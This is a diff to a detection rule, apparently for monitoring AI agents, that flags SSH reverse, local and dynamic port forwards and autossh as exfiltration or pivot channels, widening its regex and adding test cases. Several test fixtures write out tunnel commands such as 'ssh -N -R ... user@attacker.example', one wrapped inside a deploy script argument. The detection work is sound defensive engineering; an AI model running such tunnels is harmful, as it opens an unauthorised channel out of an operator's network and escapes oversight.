@@ -1,6 +1,6 @@
 id: ssh-tunnel-egress
 spec: threat-rules/v1.3  # needed for args and predicates
-version: 3
+version: 5
 title: SSH tunnel opened for egress (local / remote forward or SOCKS)
 description: >
   An SSH client is invoked with a -R (remote) port-forward, -L (local)
@@ -12,15 +12,16 @@ description: >
   opening any of these tunnels is almost always suspicious: the agent
   has no legitimate reason to expose a port on either side of its
   operator's network. The rule matches the long form (--remote-forward,
-  --local-forward, --dynamic) and the short form (-R/-L/-D) wherever it
+  --local-forward, --dynamic), the short form (-R/-L/-D) wherever it
   appears among the arguments, including inside a cluster of boolean
-  flags such as -fNL. ssh, scp or sftp is found by what the line runs
-  and the flag must be one of its words, so it fires under sudo, nohup
-  or timeout, inside `bash -c` and by path, and not for the same text
-  in a commit message or a here-document. ssh may run a remote command,
-  so every line that runs it is one the parser cannot vouch for (see
-  command_unread) and is also matched on its text, where ssh must stand
-  at a command boundary.
+  flags such as -fNL and with a bind address before the port, and the
+  same forward given as a configuration option (-o RemoteForward=..,
+  -o LocalForward=.., -o DynamicForward=..). ssh, scp, sftp or autossh is
+  found by what the line runs and the flag must be one of its words, so
+  it fires under sudo, nohup or timeout, inside `bash -c` and by path,
+  and not for the same text in a commit message or a here-document. The
+  text that reaches a command the parser cannot see into is also matched
+  (unread_text), where ssh must stand at a command boundary.
 severity: high
 status: experimental
 posture: detect
@@ -30,19 +31,56 @@ taxonomy:
   mitre_atlas: AML.T0024
 
 # The flag and its port are one word (-R8080:localhost:80) or two in a row (-R, then
-# 8080:localhost:80), so the pattern over args allows one newline between them.
+# 8080:localhost:80), so the pattern over args allows one newline between them; a bind
+# address may come before the port. The same forward as a configuration option is
+# -o RemoteForward=.., -oLocalForward=.. or -o "DynamicForward 1080".
 match: >
   e.event.action == "command.executed" && (
-    e.command.parsed_commands.exists(c, c.name.matches("^(ssh|scp|sftp)$") &&
-      c.args.matches("(?m)^-[46AaCfGgKkMNnqsTtVvXxYy]*[RL]\\n?\\d+:|^-[46AaCfGgKkMNnqsTtVvXxYy]*D\\n?\\d+\\b|^--(remote-forward|local-forward|dynamic)\\b")) ||
-    (e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b([^;&|]*\\s)?((?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*[RL])\\s*\\d+:|(?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*D)\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)") &&
-      command_unread(e))
+    e.command.parsed_commands.exists(c, c.name.matches("^(ssh|scp|sftp|autossh)$") &&
+      c.args.matches("(?m)^-[46AaCfGgKkMNnqsTtVvXxYy]*[RL]\\n?([^\\n:]*:)?\\d+:|^-[46AaCfGgKkMNnqsTtVvXxYy]*D\\n?([^\\n:]*:)?\\d+\\b|^--(remote-forward|local-forward|dynamic)\\b|^-o\\n?(?i:(remote|local|dynamic)forward)[ =]")) ||
+    unread_text(e, t, t.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp|autossh)\\b([^;&|]*\\s)?((?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*[RL])\\s*\\d+:|(?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*D)\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b|-o\\s*[\"']?(remote|local|dynamic)forward[ =])"))
   )
 
 emit:
   reason: "SSH tunnel opened for egress (ssh -R / -L / -D) — exfil or pivot channel"
 
 tests:
+  - name: remote_forward_as_an_option
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -N -o RemoteForward=9000:localhost:22 user@attacker.example" }
+        session: { id: s1 }
+  - name: dynamic_forward_as_an_attached_option
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -fN -oDynamicForward=1080 user@attacker.example" }
+        session: { id: s1 }
+  - name: local_forward_as_a_quoted_option
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -o \"LocalForward 5432 db.internal:5432\" bastion.example" }
+        session: { id: s1 }
+  - name: autossh_reverse_tunnel
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "autossh -M 0 -f -N -R 9000:localhost:22 user@attacker.example" }
+        session: { id: s1 }
+  - name: reverse_tunnel_with_a_bind_address
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -N -R 0.0.0.0:9000:localhost:22 user@attacker.example" }
+        session: { id: s1 }
+  - name: another_option_of_ssh
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -o StrictHostKeyChecking=no -o ForwardAgent=no build@host.example uptime" }
+        session: { id: s1 }
   - name: ssh_reverse_tunnel
     verdict: match
     events:
@@ -168,4 +206,16 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "scp -r -P 2200 dist deploy@host.example:/srv/app" }
+        session: { id: s1 }
+  - name: tunnel_given_to_a_project_script
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "./deploy.sh 'sudo ssh -R 8080:localhost:80 user@attacker.example'" }
+        session: { id: s1 }
+  - name: tunnel_in_a_commit_message_beside_a_project_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m 'docs: sudo ssh -R 8080:localhost:80 is banned' && ./run-tests.sh" }
         session: { id: s1 }
